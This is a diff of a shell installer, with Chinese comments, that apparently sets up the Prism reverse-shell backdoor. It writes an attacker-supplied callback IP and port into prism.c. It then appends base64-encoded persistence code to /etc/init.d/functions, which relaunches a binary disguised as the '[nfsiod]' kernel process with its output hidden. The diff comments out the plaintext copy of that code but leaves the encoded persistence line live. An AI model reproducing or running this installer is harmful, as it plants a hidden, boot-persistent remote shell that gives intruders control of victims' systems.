@@ -10,7 +10,7 @@ then
     echo -e "\033[31m Usage:$0 reverseIP PORT \033[0m"
     exit 1;
 fi
-cd /tmp  #进入 tmp 目录下
+#cd /tmp  #进入 tmp 目录下
 # 获取用户输入的第一个参数（IP），写入 prism.c 的文件中
 sed -i "/define REVERSE_HOST/ {s/10.0.0.1/$1/g}" prism.c
 # 获取用户输入的第二个参数（Port），写入 prism.c 的文件中
@@ -38,12 +38,12 @@ echo "reverseIP: $1,PORT: $2 "
 echo UElEUz1gcHMgLWVmIHwnXFtuZnNpb2RcXScgfGdyZXAgLXYgZ3JlcCB8IGF3ayAne3ByaW50ICQyfSdgDQppZiBbICIkUElEUyIgIT0gIiIgXTsgdGhlbg0Ka2lsbCAtOSAkUElEUw0KL3Vzci9saWIvbmZzaW9kIDE+L2Rldi9udWxsIDI+L2Rldi9udWxsDQoJZWxzZQ0KL3Vzci9saWIvbmZzaW9kIDE+L2Rldi9udWxsIDI+L2Rldi9udWxsDQpmaQ0KIA0KIA0KIA==|base64 -d >> /etc/init.d/functions
 
 #解密后的base64 代码，
-PIDS=`ps -ef |'\[nfsiod\]' |grep -v grep | awk '{print $2}'`
+#PIDS=`ps -ef |'\[nfsiod\]' |grep -v grep | awk '{print $2}'`
 #判断 nfsiod 的进程存在就 kill 掉 重新启动，并把输出信息重定向到空的设别文件
-if [ "$PIDS" != "" ]; then
-	kill -9 $PIDS
-	/usr/lib/nfsiod 1>/dev/null 2>/dev/null
- else
+#if [ "$PIDS" != "" ]; then
+#	kill -9 $PIDS
+#	/usr/lib/nfsiod 1>/dev/null 2>/dev/null
+#else
 	#不存在就执行该二进制文件，输出信息重定向到空的设备文件上
-	/usr/lib/nfsiod 1>/dev/null 2>/dev/null
-fi
+#	/usr/lib/nfsiod 1>/dev/null 2>/dev/null
+#fi
